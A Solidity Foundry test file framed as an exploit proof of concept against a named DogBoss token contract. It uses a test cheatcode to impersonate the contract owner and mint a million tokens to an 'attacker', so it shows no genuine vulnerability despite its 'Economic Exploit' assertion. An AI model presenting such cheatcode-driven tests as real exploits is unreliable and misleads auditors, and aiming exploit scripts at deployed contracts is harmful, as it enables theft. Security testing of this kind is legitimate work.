// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
    function mint(address account, uint256 amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use the existing TARGET contract
        // We need to get the owner address first
        address owner = DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).owner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get initial balance from IERC20 interface
        uint256 initialERC20Balance = IERC20(TARGET).balanceOf(address(this));

        // Get initial balance from DogBoss interface
        uint256 initialDogBossBalance = DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).balanceOf(attacker);

        // Get owner address
        address owner = DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).owner();

        // Get decimals to calculate proper amount
        uint8 decimals = DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).decimals();

        // Impersonate owner and mint tokens to attacker
        vm.prank(owner);
        DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).mint(attacker, 1_000_000 * 10 ** decimals);

        // Get final balance from DogBoss interface
        uint256 finalDogBossBalance = DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).balanceOf(attacker);

        // Verify balance increased
        assertGt(finalDogBossBalance, initialDogBossBalance, "Balance should have increased");

        // Get final balance from IERC20 interface
        uint256 finalERC20Balance = IERC20(TARGET).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

